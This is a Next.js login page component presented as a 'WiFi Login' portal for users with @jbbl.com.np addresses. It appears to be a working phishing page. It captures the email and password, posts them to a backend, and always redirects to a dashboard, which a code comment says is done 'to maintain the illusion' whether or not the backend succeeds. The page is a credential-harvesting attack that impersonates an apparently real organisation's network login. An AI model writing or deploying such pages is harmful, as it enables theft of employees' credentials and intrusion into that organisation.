'use client';

import React, { useState } from 'react';
import { useRouter } from 'next/navigation';

const HomePage: React.FC = () => {
  const router = useRouter();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [message, setMessage] = useState('');

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!username.endsWith('@jbbl.com.np')) {
      setMessage('Only @jbbl.com.np emails are allowed ❌');
      return;
    }

    if (username && password) {
      try {
        // Send credentials to backend in the background
        await fetch('/api/login', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ username, password }),
        });
      } catch (error) {
        console.error('Login error:', error);
      } finally {
        // Always redirect to dashboard to maintain the illusion, even if backend fails
        router.push('/dashboard');
      }
    } else {
      setMessage('Invalid credentials ❌');
    }
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center bg-cover bg-center"
      style={{ backgroundImage: "url('/Jbbl.png')" }}
    >
      <div className="bg-white p-8 rounded-2xl shadow-xl w-full max-w-md">
        <h1 className="text-2xl font-bold mb-6 text-center text-gray-800">WiFi Login</h1>
        <form onSubmit={handleLogin} className="space-y-4">
          <div>
            <label className="block mb-1 font-medium text-gray-700">Email Address</label>
            <input
              type="email"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              placeholder="name@jbbl.com.np"
              className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500 text-gray-800"
              required
            />
          </div>

          <div>
            <label className="block mb-1 font-medium text-gray-700">Password</label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter password"
              className="w-full border border-gray-300 rounded px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500 text-gray-800"
              required
            />
          </div>

          <button
            type="submit"
            className="w-full bg-blue-600 text-white py-2 rounded-lg font-semibold hover:bg-blue-700 transition shadow-md"
          >
            Login
          </button>
        </form>

        {message && (
          <p className="mt-4 text-center text-gray-800 font-medium">{message}</p>
        )}
      </div>
    </div>
  );
};

export default HomePage;
